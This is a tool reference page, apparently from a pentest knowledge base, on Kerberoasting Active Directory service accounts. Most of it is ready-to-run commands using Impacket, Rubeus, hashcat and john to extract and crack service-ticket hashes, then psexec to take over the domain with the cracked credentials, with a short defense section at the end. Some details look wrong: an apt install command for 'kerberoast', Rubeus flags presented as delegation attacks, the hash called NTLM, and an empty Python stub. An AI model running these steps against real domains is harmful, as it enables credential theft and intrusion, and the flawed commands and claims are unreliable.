---
tool_name: "kerberoast"
display_name: "Kerberoast"
mitre_tactic: "credential_access"
mitre_tactic_id: "TA0006"
mitre_subcategory: "kerberos"
install_command: "sudo apt install kerberoast"
version: "1.0"
github_repo: "https://github.com/GhostPack/Rubeus"
kali_tools_page: "https://www.kali.org/tools/kerberoast/"
difficulty_level: "advanced"
requires_root: false
gui_available: false
tags: ["kerberos", "active-directory", "windows", "hash", "roasting"]
related_tools: ["rubeus", "impacket", "hashcat"]
---

# Kerberoast

## Chapter 1: Introduction & Overview

### What is Kerberoast?
Kerberoast is an attack against Kerberos service tickets. It extracts service ticket hashes and cracks them offline to recover service account passwords.

### History & Background
- **Created:** 2014 by Tim Medin
- **Maintained:** Various implementations
- **License:** Various
- **Purpose:** Kerberos service ticket cracking

Kerberoasting exploits Kerberos authentication in Active Directory.

### When to Use This Tool
- **Penetration testing:** Attack Active Directory
- **Red team operations:** Extract service credentials
- **Security assessments:** Test Kerberos security
- **CTF challenges:** Solve AD challenges

### Key Concepts
- **Kerberos:** Network authentication protocol
- **Service Ticket:** Ticket for service access
- **TGS:** Ticket Granting Service
- **Hash:** NTLM hash of service account
- **Roasting:** Extracting and cracking tickets

---

## Chapter 2: Installation & Setup

### System Requirements
- **OS:** Windows or Linux (with Impacket)
- **Privileges:** Domain user
- **Access:** Active Directory domain

### Installation Methods

#### Method 1: Impacket (Linux)
```bash
sudo apt install impacket-scripts
```

#### Method 2: Rubeus (Windows)
```bash
# Download from GitHub
https://github.com/GhostPack/Rubeus
```

### Verification
```bash
# Impacket
impacket-GetUserSPNs --help

# Rubeus
Rubeus.exe
```

---

## Chapter 3: Basic Usage

### First Attack

#### Impacket Method
```bash
impacket-GetUserSPNs domain/user:password -request
```
**Output:** Extracts service ticket hashes.

#### Rubeus Method
```bash
Rubeus.exe kerberoast /outfile:hashes.txt
```
**Output:** Extracts hashes to file.

### Essential Commands

#### Impacket Kerberoast
```bash
impacket-GetUserSPNs domain/user:password -request -outputfile hashes.txt
```
**Explanation:** Extracts TGS hashes.

#### Rubeus Kerberoast
```bash
Rubeus.exe kerberoast /outfile:hashes.txt
```
**Explanation:** Extracts hashes to file.

### Complete Command Reference

#### Impacket Commands
| Command | Description | Example |
|---------|-------------|---------|
| `GetUserSPNs` | Get service accounts | `impacket-GetUserSPNs domain/user:pass` |
| `-request` | Request tickets | `impacket-GetUserSPNs domain/user:pass -request` |
| `-outputfile` | Output file | `impacket-GetUserSPNs domain/user:pass -outputfile hashes.txt` |
| `-dc-ip` | Domain controller | `impacket-GetUserSPNs domain/user:pass -dc-ip 192.168.1.1` |
| `-target-domain` | Target domain | `impacket-GetUserSPNs domain/user:pass -target-domain target.local` |

#### Rubeus Commands
| Command | Description | Example |
|---------|-------------|---------|
| `kerberoast` | Kerberoast attack | `Rubeus.exe kerberoast` |
| `/outfile` | Output file | `Rubeus.exe kerberoast /outfile:hashes.txt` |
| `/tgtdeleg` | Delegate TGT | `Rubeus.exe kerberoast /tgtdeleg` |
| `/stats` | Show stats | `Rubeus.exe kerberoast /stats` |

---

## Chapter 4: Intermediate Usage

### Advanced Attack Techniques

#### Target Specific Service
```bash
# Impacket
impacket-GetUserSPNs domain/user:password -request -targetuser svc_sql

# Rubeus
Rubeus.exe kerberoast /user:svc_sql
```

#### Multiple Domains
```bash
# Impacket
impacket-GetUserSPNs domain/user:password -request -target-domain child.domain.local
```

### Scripting & Automation

#### Bash Scripting
```bash
#!/bin/bash
# Automated kerberoast
DOMAIN="domain.local"
USER="admin"
PASS="password"

impacket-GetUserSPNs $DOMAIN/$USER:$PASS -request -outputfile kerberoast_hashes.txt
```

#### Python Scripting
```python
#!/usr/bin/env python3
from impacket.krb5.kerberosv5 import getKerberosTGT
from impacket.krb5.kerberosv5 import getKerberosTGS
from impacket.krb5.types import Principal, KerberosTime
from impacket.krb5 import constants

def kerberoast(username, password, domain, target_user):
    """Perform kerberoast attack"""
    # Implementation
    pass
```

### Combining with Other Tools

#### With Hashcat
```bash
# Crack kerberoast hashes
hashcat -m 13100 hashes.txt rockyou.txt
```

#### With John
```bash
# Crack kerberoast hashes
john --format=krb5tgs hashes.txt
```

### Advanced Configurations

#### Custom SPN
```bash
# Request specific SPN
impacket-GetUserSPNs domain/user:password -request -spn MSSQLSvc/sql.domain.local
```

---

## Chapter 5: Advanced Usage

### Advanced Attack Techniques

#### Unconstrained Delegation
```bash
# Find unconstrained delegation
impacket-findDelegation domain/user:password

# Attack
Rubeus.exe kerberoast /unconstrained
```

#### Constrained Delegation
```bash
# Find constrained delegation
impacket-findDelegation domain/user:password

# Attack
Rubeus.exe kerberoast /constrained
```

### Integration in Pentest Workflow

#### Phase 1: Reconnaissance
```bash
# Find service accounts
impacket-GetUserSPNs domain/user:password -request
```

#### Phase 2: Extraction
```bash
# Extract hashes
impacket-GetUserSPNs domain/user:password -request -outputfile hashes.txt
```

#### Phase 3: Cracking
```bash
# Crack with hashcat
hashcat -m 13100 hashes.txt rockyou.txt
```

### Advanced Configurations

#### Stealth Mode
```bash
# Use existing TGT
Rubeus.exe kerberoast /tgtdeleg

# Slow requests
Rubeus.exe kerberoast /interval:30
```

---

## Chapter 6: Real-World Scenarios

### Scenario 1: CTF Challenge
**Objective:** Get domain admin

**Steps:**
```bash
# 1. Kerberoast service accounts
impacket-GetUserSPNs domain/user:password -request -outputfile hashes.txt

# 2. Crack hashes
hashcat -m 13100 hashes.txt rockyou.txt

# 3. Use cracked credentials
impacket-psexec domain/svc_sql:password@dc01.domain.local
```

### Scenario 2: Penetration Test
**Objective:** Compromise domain

**Steps:**
```bash
# 1. Enumerate service accounts
impacket-GetUserSPNs domain/user:password -request

# 2. Extract hashes
impacket-GetUserSPNs domain/user:password -request -outputfile kerberoast.txt

# 3. Crack offline
hashcat -m 13100 kerberoast.txt rockyou.txt

# 4. Use service account
impacket-psexec domain/svc_account:password@dc01
```

---

## Chapter 7: Detection & Defense

### How Defenders Detect Kerberoast

#### Network Indicators
```
# TGS-REQ for service accounts
# Unusual service ticket requests
# Offline cracking attempts
```

#### Log Analysis
```bash
# Windows Event Logs
# Event ID 4769 - Kerberos Service Ticket Operation
# Event ID 4770 - Kerberos Service Ticket Renewal

# Monitor for unusual TGS requests
```

### Mitigation Strategies

#### Strong Service Account Passwords
```bash
# Use 25+ character passwords
# Rotate passwords regularly
# Use managed service accounts
```

#### Service Account Management
```bash
# Disable unnecessary services
# Use Group Managed Service Accounts
# Monitor service ticket requests
```

### Blue Team Response
1. **Use strong service passwords** - 25+ characters
2. **Implement managed accounts** - gMSA
3. **Monitor TGS requests** - Detect anomalies
4. **Rotate passwords regularly** - Limit exposure
5. **Disable unnecessary SPNs** - Reduce attack surface

---

## Chapter 8: Troubleshooting

### Common Errors

#### Error: "KDC_ERR_S_PRINCIPAL_UNKNOWN"
**Cause:** SPN not found
**Solution:**
```bash
# Check SPNs
impacket-GetUserSPNs domain/user:password -request

# Verify target account
```

#### Error: "Access Denied"
**Cause:** Insufficient permissions
**Solution:**
```bash
# Verify credentials
impacket-GetUserSPNs domain/user:password -request

# Check domain access
```

### Performance Optimization

#### Slow Extraction
```bash
# Use existing TGT
impacket-GetUserSPNs domain/user:password -request -k

# Use specific DC
impacket-GetUserSPNs domain/user:password -dc-ip 192.168.1.1
```

### FAQ

**Q: Is kerberoasting legal to use?**
A: Yes, kerberoasting is a legitimate security testing technique. However, using it without authorization is illegal. Always get written permission before testing.

**Q: How do I crack kerberoast hashes?**
A: Use hashcat: `hashcat -m 13100 hashes.txt rockyou.txt`

**Q: What service accounts are vulnerable?**
A: Accounts with SPNs set, especially those with weak passwords.

**Q: How do I detect kerberoasting?**
A: Monitor Event ID 4769 for unusual TGS requests.

---

## Resources

### Official Documentation
- [Impacket Documentation](https://github.com/fortra/impacket)
- [Rubeus GitHub](https://github.com/GhostPack/Rubeus)
- [Kerberoast Paper](https://www.harmj0y.net/blog/pentesting/kerberoasting-without-mimikatz/)

### Tutorials
- [Kerberoast Tutorial - HackTricks](https://book.hacktricks.xyz/windows-hardening/active-directory-attacks/kerberoast)
- [Kerberoast Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md)

### Related Tools
- **Rubeus:** Kerberos toolkit
- **Impacket:** Python network toolkit
- **hashcat:** Password cracker
- **john:** John the Ripper

### Practice Resources
- [HackTheBox](https://www.hackthebox.com/)
- [TryHackMe](https://tryhackme.com/)
- [VulnHub](https://www.vulnhub.com/)
